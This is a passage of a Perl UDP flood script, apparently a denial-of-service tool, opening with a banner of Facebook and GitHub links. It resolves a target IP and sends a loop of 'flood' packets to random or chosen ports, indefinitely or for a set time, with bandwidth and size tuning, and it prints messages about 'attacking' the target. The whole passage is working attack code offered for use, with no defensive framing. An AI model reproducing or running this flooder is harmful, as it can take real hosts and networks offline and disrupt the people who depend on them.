        [JOIN] https://m.facebook.com/100065476416784/
	[HELP] https://github.com/Beelzebuuuuu

EOL
sleep(3);
if ($bw && $delay) {
  print BOLD RED "[w]\n â•°â”€â”€âž¤ Computed packet size overwrites the --size parameter ignored\n",RESET;
  $size = int($bw * $delay / 8);
} elsif ($bw) {
  $delay = (8 * $size) / $bw;
}

$size = 256 if $bw && !$size;

($bw = int($size / $delay * 8)) if ($delay && $size);

my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die BOLD RED "[w]â”€âž¤ Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD GREEN "Atacking to ip:" . RESET " $ip " . ($port ? $port : YELLOW "random") . " port with " . 
  ($size ? "$size-byte" : YELLOW "random size") . " packets" . ($time ? " for $time seconds" : "") . "\n";
print GREEN "[+]â”€âž¤ Interpacket delay $delay msec\n" if $delay;
print "[+]â”€âž¤ Total IP bandwidth $bw kbps\n" if $bw;
print YELLOW "\n[!]â”€âž¤ To shut down the attack press Ctrl+C\n" unless $time;

die BOLD RED "[w]â”€âž¤ Invalid packet size requested: $size\n" if $size && ($size < 64 || $size > 1500);
$size -= 28 if $size;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  usleep(1000 * $delay) if $delay;
  }
